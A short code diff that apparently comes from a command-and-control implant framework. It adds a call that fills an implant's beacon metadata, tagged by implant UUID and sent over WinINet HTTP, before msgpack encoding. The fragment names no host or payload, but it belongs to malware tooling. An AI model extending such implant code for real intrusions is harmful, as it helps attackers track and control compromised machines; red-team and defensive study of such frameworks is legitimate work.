@@ -30,6 +30,7 @@ Required Keys:
 
 //specific to the wininet http impl
 #include "../protocols/http_wininet/http.h"
+#include "../modules/metadata.h"
 using namespace std::string_literals;
 
 nlohmann::json [[ http_get_function_name ]](std::string implant_uuid) {
@@ -39,6 +40,9 @@ nlohmann::json [[ http_get_function_name ]](std::string implant_uuid) {
     // Prep metadata as plaintext/unobsfucated
     std::map<std::string, std::string> metadata_map;
     metadata_map["implant_uuid"] = implant_uuid;
+    populate_metadata(metadata_map); //populate metadata with rest of metadata options
+
+    //create the msgpack rep of metadata
     std::vector<uint8_t> metadata_as_msgpack;
     create_metadata(metadata_map, metadata_as_msgpack);
 
